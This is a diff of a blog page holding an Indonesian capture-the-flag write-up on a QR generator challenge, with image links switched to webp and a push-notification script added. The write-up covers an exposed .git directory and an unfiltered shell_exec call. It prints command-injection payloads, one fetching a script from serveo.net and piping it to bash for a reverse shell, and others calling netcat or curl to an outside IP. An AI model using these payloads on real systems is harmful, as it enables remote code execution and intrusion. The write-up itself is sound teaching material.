@@ -42,6 +42,18 @@ if (!doNotTrack) {
 </script>
 <script async src='https://www.google-analytics.com/analytics.js'></script>
 
+	<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
+	<script>
+	var OneSignal = window.OneSignal || [];
+	OneSignal.push(function() {
+		OneSignal.init({
+			appId: "6a6c99a5-9957-48e6-a3be-0d88a9b5850b",
+				notifyButton: {
+					enable: true,
+				},
+			});
+		});
+	</script>
     <script data-ad-client="ca-pub-1926937123072670" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>	
 </head>
 <body class="body">
@@ -107,36 +119,36 @@ if (!doNotTrack) {
 </div></div>
 		</header>
 		<figure class="post__thumbnail">
-			<img src="/img/qr/banner.png" alt="Solution for QR Generator Challenges">
+			<img src="/img/qr/banner.webp" alt="Solution for QR Generator Challenges">
 		</figure><div class="content post__content clearfix">
 			<!-- raw HTML omitted -->
 <ol>
 <li>
 <p>Diberikan Challenges<br>
-<img src="/img/qr/challenges.png" alt="telegram"><br>
+<img src="/img/qr/challenges.webp" alt="telegram"><br>
 Seperti biasa, challenges dipost di group Surabaya Hacker Link, ternyata tidak ada clue dari challenges ini, langung tancap gas kita akses web tersebut. Ternyata sebuah page QR Generator dengan inputan nama dan instagram.</p>
 </li>
 <li>
 <p>Pengecekan Source Code<br>
-<img src="/img/qr/source.png" alt="source-code"><br>
+<img src="/img/qr/source.webp" alt="source-code"><br>
 Sebelum kita coba fitur dari web ini, kita cek source code-nya, apakah ada yang mencurigakan atau comment info dari pembuat Ternyata tidak ada apa-apa selain comment default dari bootstrap</p>
 </li>
 <li>
 <p>Mencoba Fitur<br>
 Kita coba fitur web ini dengan menginputkan semua field yang ada, tentunya dengan random data yang valid.  Setelah di submit kita mendapatkan QR Code, kita coba buka ternyata hasilnya adalah base64 dan hasil decode dari enkripsi tersebut adalah data yang sebelumnya kita inputkan.<br>
-<img src="/img/qr/coba-fitur.png" alt="coba-fitur"><br>
-<img src="/img/qr/qrcode.png" alt="qr"><br>
+<img src="/img/qr/coba-fitur.webp" alt="coba-fitur"><br>
+<img src="/img/qr/qrcode.webp" alt="qr"><br>
 Berhenti sejenak dan mencari vulnerability terhadap QR Code hasilnya nihil :(</p>
 </li>
 <li>
 <p>Pengecekan Common Web Directory<br>
 Setelah berfikir cukup keras, kita coba brute directory yang ada pada web tersebut dengan common web list menggunakan gobuster<br>
-<img src="/img/qr/gobuster.png" alt="gobuster-brute"></p>
+<img src="/img/qr/gobuster.webp" alt="gobuster-brute"></p>
 </li>
 <li>
 <p>Found Git Repository Exposed<br>
 Dari hasil gobuster ada header 200 OK terhadap folder .git dan common file/folder dari git, kita cek terlebih dahulu apakah report yang diberikan oleh gobuster benar dan tidak false positive<br>
-<img src="/img/qr/git-directory.png" alt="image"><br>
+<img src="/img/qr/git-directory.webp" alt="image"><br>
 Ternyata benar ada exposed git directory di sana</p>
 </li>
 <li>
@@ -146,7 +158,7 @@ Tanpa basa basi kita dump aja, jika bingung bagaimana melakukan dump exposed git
 <li>
 <p>Git Reset Hard Head<br>
 Kita lakukan reset agar file / folder dari repo git tersebut keluar.<br>
-<img src="/img/qr/reset.png" alt="reset-git"></p>
+<img src="/img/qr/reset.webp" alt="reset-git"></p>
 </li>
 <li>
 <p>Baca Source Code<br>
@@ -155,7 +167,7 @@ Waktunya baca-baca kode, ternyata hanya ada file index.php dan sisanya hanya fil
 <li>
 <p>Menemukan fungsi shell_exec<br>
 Kita baca file index.php dan ada fungsi yang cukup berbahaya, yaitu shell_exec dan yang lebih berbahayanya lagi penggunaan fitur ini tidak difilter dengan baik<br>
-<img src="/img/qr/shell_exec.png" alt="shell_exec"></p>
+<img src="/img/qr/shell_exec.webp" alt="shell_exec"></p>
 </li>
 <li>
 <p>Analisa kode<br>
@@ -173,19 +185,19 @@ Dengan merubah nama menjadi payload yang dipakai <code>blabla||printf laztname &
 </li>
 <li>
 <p>Pwned<br>
-<img src="/img/qr/back-connect-with-curl.png" alt="backconnect-curl"><br>
+<img src="/img/qr/back-connect-with-curl.webp" alt="backconnect-curl"><br>
 Tidak hanya menulis solver tapi kita dapat melakukan reverse shell dengan bantuan curl namun kita perlu sebuah ip public agar dapat melakukan reverse shell / backconnet tapi disini saya menggunakan serveo, pada port 80 local akan diforward ke serveo.net:2221, dan pada listening port 1337 local akan menerima dari serveo.net:2232 setelahnya pada field nama kita inputkan payload <code>blabla||curl serveo.net:2221 | bash #</code> jangan lupa lakukan submit sebanyak dua kali agar shell_exec tertriger, dan pada local 1337 kita akan mendapatkan session<br>
 sebenarnya dapat menggunakan nc namun pada target soal ketika memasukan slash (/) shell tidak berjalan dengan baik</p>
 </li>
 </ol>
 <p>Another shell check:<br>
 Dari challenges ini kita juga dapat melakukan pengetesan apakah fungsi shell_exec itu berjalan atau tidak dengan bantuan netcat, melakukan listening di server pribadi, dan pada field nama <code>blabla||nc 12.12.12.12 4400 &amp;</code> dan berhasil, di listening akan ada info connection from blablabla<br>
-<img src="/img/qr/netcat.png" alt="netcat-check"></p>
+<img src="/img/qr/netcat.webp" alt="netcat-check"></p>
 <p>Namun jika netcat tidak terinstall di server target maka hal tersebut tidak bisa dilakukan, dengan cara lain kita bisa menggunakan curl, sama seperti diatas, kita melakukan listening di server pribadi dan pada field nama diinputkan payload <code>blabla||curl 12.12.12.12 4400</code> jika berhasil maka akan info connection from blabla<br>
-<img src="/img/qr/netcat-curl.png" alt="netcat-curl"></p>
+<img src="/img/qr/netcat-curl.webp" alt="netcat-curl"></p>
 <p>Yet another tips:<br>
 Karena hasil dari shell_exec tidak di tampilkan maka susah diketahui berjalan atau tidak tetapi dapat &ldquo;diakali&rdquo; dengan mem-pipe command ke server pribadi<br>
-<img src="/img/qr/command-output.png" alt="command-output"></p>
+<img src="/img/qr/command-output.webp" alt="command-output"></p>
 <p>Side Story:
 Sebetulnya challenges ini berasal dari tugas kuliah membuat id card generator yang hasil inputan disimpan tanpa ada duplikat, karena saya sendiri belum tamat php jadi tidak tahu (dan menahu) cara hapus file di php karena terbiasa dengan bash maka pada id card generator menggunakan shell_exec, sehari sebelum production saya penasaran apakah ini bisa dilakukan RCE (Remote Code Execution) atau tidak, dan terciptalah challenges ini</p>
 <p>See you on next challenges</p>
@@ -215,7 +227,7 @@ Bash Cheatsheet -&gt; <a href="https://devhints.io/bash.html">Read more&hellip;<
 
 <div class="authorbox clearfix">
 	<figure class="authorbox__avatar">
-		<img alt="Ardi Jonias Fortuna avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+		<img alt="Ardi Jonias Fortuna avatar" src="/img/avatar.webp" class="avatar" height="90" width="90">
 	</figure>
 	<div class="authorbox__header">
 		<span class="authorbox__name">About Ardi Jonias Fortuna</span>
